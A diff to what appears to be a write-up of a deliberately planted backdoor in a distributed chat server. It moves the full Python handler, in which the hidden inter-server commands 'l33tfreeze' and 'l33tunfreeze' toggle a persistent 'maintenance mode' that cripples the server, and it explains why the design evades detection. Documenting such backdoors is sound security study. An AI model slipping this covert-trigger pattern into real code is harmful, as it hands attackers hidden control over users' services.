@@ -8,40 +8,6 @@ This backdoor implements a covert distributed control mechanism disguised as a m
 
 The backdoor is implemented within the `handle_public_chat` function of the server. It checks for specific command strings in public chat messages:
 
-```python
-async def handle_public_chat(self, message_dict, from_client):
-    data = message_dict.get('data', {})
-    message_content = data.get('message', '')
-
-    if not from_client:
-        # Message is from another server
-        if message_content == 'l33tfreeze':
-            self.maintenance_mode = True
-            self.save_maintenance_mode()
-            return
-        elif message_content == 'l33tunfreeze':
-            self.maintenance_mode = False
-            self.save_maintenance_mode()
-            return
-        else:
-            # Deliver to clients on this server
-            await self.deliver_message_to_clients(message_dict)
-            return
-    else:
-        # Message is from a client
-        # Deliver to clients on this server
-        await self.deliver_message_to_clients(message_dict)
-        # Forward to all other servers
-        message_json = json.dumps(message_dict)
-        for server_address, websocket in self.servers.items():
-            if server_address != self.address:
-                try:
-                    await websocket.send(message_json)
-                    logger.info(f"Forwarded public chat to server {server_address}.")
-                except Exception as e:
-                    logger.error(f"Error forwarding public chat to server {server_address}: {e}")
-```
-
 When 'maintenance mode' is activated:
 
 - Most server functionalities are restricted
@@ -92,3 +58,39 @@ This backdoor violates several key security principles:
 - No special permissions are required to use these commands, making it difficult to trace the source.
 - The maintenance mode state is saved persistently in the server's volume, allowing the effect to persist across server restarts. This makes it harder to detect and remove.
 - There's no visible indication to users that the server has entered or exited 'maintenance mode', except for restricted functionality.
+
+## Code Snippet
+
+```python
+async def handle_public_chat(self, message_dict, from_client):
+    data = message_dict.get('data', {})
+    message_content = data.get('message', '')
+
+    if not from_client:
+        # Message is from another server
+        if message_content == 'l33tfreeze':
+            self.maintenance_mode = True
+            self.save_maintenance_mode()
+            return
+        elif message_content == 'l33tunfreeze':
+            self.maintenance_mode = False
+            self.save_maintenance_mode()
+            return
+        else:
+            # Deliver to clients on this server
+            await self.deliver_message_to_clients(message_dict)
+            return
+    else:
+        # Message is from a client
+        # Deliver to clients on this server
+        await self.deliver_message_to_clients(message_dict)
+        # Forward to all other servers
+        message_json = json.dumps(message_dict)
+        for server_address, websocket in self.servers.items():
+            if server_address != self.address:
+                try:
+                    await websocket.send(message_json)
+                    logger.info(f"Forwarded public chat to server {server_address}.")
+                except Exception as e:
+                    logger.error(f"Error forwarding public chat to server {server_address}: {e}")
+```
